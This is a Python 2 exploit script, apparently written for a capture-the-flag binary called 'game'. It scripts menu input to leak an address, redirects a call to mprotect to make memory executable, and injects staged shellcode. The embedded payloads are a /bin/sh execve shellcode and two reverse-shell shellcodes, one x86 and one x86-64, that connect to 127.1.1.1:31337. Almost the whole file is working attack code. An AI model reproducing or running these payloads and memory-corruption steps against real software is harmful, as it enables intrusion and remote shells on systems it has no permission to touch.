import subprocess
import fcntl
import os
import select
from time import sleep
from async_subprocess import AsyncPopen
from struct import pack, unpack

def debugInput(p,input, debug=True):
	if debug:
		print "Input:", input
	return p.communicate(input)

def readAll(p):
	buf = ""
	while True:
		ready, _, _ = select.select((p,), (), (), .1)
#		print ready
		if p in ready:
			buf += p.read(1)
		else:
			return buf
	return buf

def dumpSeq():
	sleep(.1)
	(out, err) = debugInput(p,"")
	print out
	print debugInput(p,"1\n")

	sleep(.1)
	(out, err) = debugInput(p,"100\n")
	print out

	sleep(.1)
	(out, err) = debugInput(p,"2\n")
	print out

def calltheSUM():
	# Call the sum

	sleep(.1)
	(out, err) = debugInput(p,"4\n")
	print out

	sleep(.1)
	(out, err) = debugInput(p,"0\n")
	print out

	sleep(.1)
	(out, err) = debugInput(p,"7\n")
	print out

	sleep(.1)
	(out, err) = debugInput(p,"")
	print out

stage1 = "\x68\x00\x10\x00\x00\xB8\x80\x84\x04\x08\xFF\xD0\x89\xC1\x68\x00\x05\x00\x00\x51\x6A\x00\xB8\x50\x84\x04\x08\xFF\xD0\x89\xC8\x90\x90\xFF\xD0\x90\x90"

stage2 = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"


stage2bis = "\x90\x90\x90\x90\x90\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + \
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + \
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" + \
"\x02" + "\x7a\x69" + "\xc7\x44\x24\x04" + "\x7f\x01\x01\x01" + "\x48\x89\xe6\x6a\x10" + \
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" + \
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + \
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + \
"\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90\x90\x90"

stage2bis = "\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2" + \
"\xb0\x66\xb3\x01\x51\x6a\x06\x6a" + \
"\x01\x6a\x02\x89\xe1\xcd\x80\x89" + \
"\xc6\xb0\x66\x31\xdb\xb3\x02\x68" + \
"\x7f\x01\x01\x01" + "\x66\x68" + "\x7a\x69" +  "\x66\x53\xfe" + \
"\xc3\x89\xe1\x6a\x10\x51\x56\x89" + \
"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe" + \
"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31" + \
"\xc0\x52\x68\x6e\x2f\x73\x68\x68" + \
"\x2f\x2f\x62\x69\x89\xe3\x52\x53" + \
"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd" + \
"\x80\x90\x90\x90\x90";

p = AsyncPopen("./game", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

raw_input("Premi per proseguire")

dumpSeq()

sleep(.1)
(out, err) = debugInput(p,"")
dump = out.split("\n")
originalbuf = dump[60]
writeplt = dump[61]
print originalbuf

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"61\n")
print out

for i in range(0,60):
	sleep(.1)
	(out, err) = debugInput(p,"%d\n"%i)
	print out

sleep(.1)
newbuf = str(int(originalbuf,16)+(4*60) )
(out, err) = debugInput(p,newbuf+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out



dumpSeq()
#wriete Mem

sleep(1)
(out, err) = debugInput(p,"")
print out


sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

sleep(.1)
(out, err) = debugInput(p,"2\n")
print out

sleep(.1)
(out, err) = debugInput(p,newbuf+"\n")
print out


mprotect = str(int("08048440",16))
sleep(.1)
(out, err) = debugInput(p,mprotect+"\n")
print out
#Sam is now mprotect


sleep(.1)
(out, err) = debugInput(p,"")
print out
print debugInput(p,"1\n")

sleep(.1)
(out, err) = debugInput(p,"100\n")
print out

sleep(.1)
(out, err) = debugInput(p,"2\n")
print out


#repos buff Mem

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
oobuf = str(int(originalbuf,16))
(out, err) = debugInput(p,oobuf+"\n")
print out

#write paramiters

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"2\n")
print out

sleep(.1)
#Allinea mprotect alla pagina
page = str(int(originalbuf[:-3]+"000",16))

(out, err) = debugInput(p,page+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,"100\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

calltheSUM()

raw_input("Aspetta")


#write stage1

sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"%d\n" % 61)
print out

for i in range(0,len(stage1)/4):
	sleep(.1)
	shellpart = str(unpack("i",stage1[4*i:4*(i+1)])[0])
	print "<",shellpart, ">"
	(out, err) = debugInput(p,shellpart+"\n")
	print out


for i in range(len(stage1)/4,60):
	sleep(.1)
	(out, err) = debugInput(p,"%d\n"%i)
	print out


sleep(.1)
newbuf = str(int(originalbuf,16)+(4*60) )
(out, err) = debugInput(p,newbuf+"\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out


#wriete Mem

sleep(1)
(out, err) = debugInput(p,"")
print out


sleep(.1)
(out, err) = debugInput(p,"1\n")
print out

sleep(.1)
(out, err) = debugInput(p,"")
print out

sleep(.1)
(out, err) = debugInput(p,"2\n")
print out

sleep(.1)
(out, err) = debugInput(p,newbuf+"\n")
print out

print originalbuf
shell = str(int(originalbuf,16))
sleep(.1)
(out, err) = debugInput(p,shell+"\n")
print out



calltheSUM()

raw_input("Aspetta")

sleep(.1)
(out, err) = debugInput(p,stage2bis+"\n")
print out

raw_input("Aspetta")

sleep(.1)
(out, err) = debugInput(p,"ls"+"\n")
print out


sleep(.1)
(out, err) = debugInput(p,"ls"+"\n")
print out














#inf = p.stdin
#out = p.stdout

#print readAll(out)
#inf.write("1\n")
#inf.flush()
#sleep(0.1)
#print readAll(out)

p.kill()